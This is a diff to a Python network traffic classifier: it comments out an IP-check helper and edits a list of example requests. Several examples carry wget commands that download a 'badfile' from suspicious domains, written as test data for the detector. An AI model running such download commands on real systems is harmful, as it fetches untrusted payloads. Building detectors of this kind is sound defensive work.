@@ -69,9 +69,9 @@ class TrafficFilter:
         return Classification(request, predictions)
 
 
-    def is_ip(self, ip: str):
-        """ A simple check to determine if a string is a valid IP address """
-        return ip.count('.') == 3 and all(part.isdigit() for part in ip.split('.'))
+    # def is_ip(self, ip: str):
+    #     """ A simple check to determine if a string is a valid IP address """
+    #     return ip.count('.') == 3 and all(part.isdigit() for part in ip.split('.'))
     
     # def extract_domain(self, text: str):
     #     """
@@ -150,9 +150,7 @@ requests = [
     # Example Requests covering various formats
     Request(process_path="/usr/bin/python3", process_id="67890", destination_ip="affiliatecashpile.go2jump.org", destination_port="80", protocol="tcp", user_id="1000", process_args="wget http://affiliatecashpile.go2jump.org/badfile"),
     Request(process_path="/usr/bin/python3", process_id="67890", destination_ip="088156060096.nidzica.vectranet.pl", destination_port="80", protocol="tcp", user_id="1000", process_args="wget http://088156060096.nidzica.vectranet.pl/badfile"),
-    
     Request(process_path="firefox", process_id="6789", destination_ip="0-0-0-0-0-0proxy.tserv.se", destination_port="443", protocol="TCP", user_id="user4", process_args="https://0-0-0-0-0-0proxy.tserv.se"),
-    
     Request(process_path="chrome", process_id="1234", destination_ip="104.27.135.50", destination_port="443", protocol="TCP", user_id="user1", process_args="http://armdl.adobe.com/"),
     
     Request(process_path="chrome", process_id="2345", destination_ip="185.221.88.122", destination_port="443", protocol="TCP", user_id="user2", process_args="https://www.8cr.purredheanb.online"),
